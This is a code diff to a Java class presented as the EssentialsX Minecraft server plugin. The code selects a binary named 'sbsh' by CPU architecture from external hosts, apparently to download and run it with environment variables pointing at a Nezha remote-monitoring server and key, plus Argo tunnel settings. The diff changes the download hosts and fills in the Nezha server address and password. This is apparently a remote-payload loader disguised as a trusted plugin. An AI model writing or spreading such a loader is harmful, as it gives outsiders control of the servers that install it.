@@ -44,9 +44,9 @@ public class EssentialsX extends JavaPlugin {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://github.com/wxvxx/myself/releases/download/amd64/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            url = "https://github.com/wxvxx/myself/releases/download/arm64/sbsh";
         } else if (osArch.contains("s390x")) {
             url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
@@ -75,9 +75,9 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         env.put("UUID", "6e245c9d-a4aa-4add-b75e-45ee9120cc4c");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nezha.ggff.net:8008");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "nezha123@");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
